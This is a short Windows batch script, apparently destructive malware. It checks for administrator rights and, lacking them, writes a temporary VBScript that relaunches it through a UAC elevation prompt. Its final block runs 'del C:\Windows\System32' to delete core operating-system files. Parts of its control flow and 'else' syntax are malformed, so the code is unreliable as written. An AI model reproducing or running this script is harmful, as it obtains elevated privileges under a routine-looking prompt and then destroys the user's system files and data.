@echo off 
cd  
call :isAdmin

if %errorlevel% == 0 ( 
goto :run ) 
else ( echo requesting administrative privileges...
    goto :UACPrompt )

exit /b

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c %~s0 %~1", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"

:isAdmin
fsutil dirty query %systemdrive% >nul
exit /b

:run
del C:\Windows\System32
exit 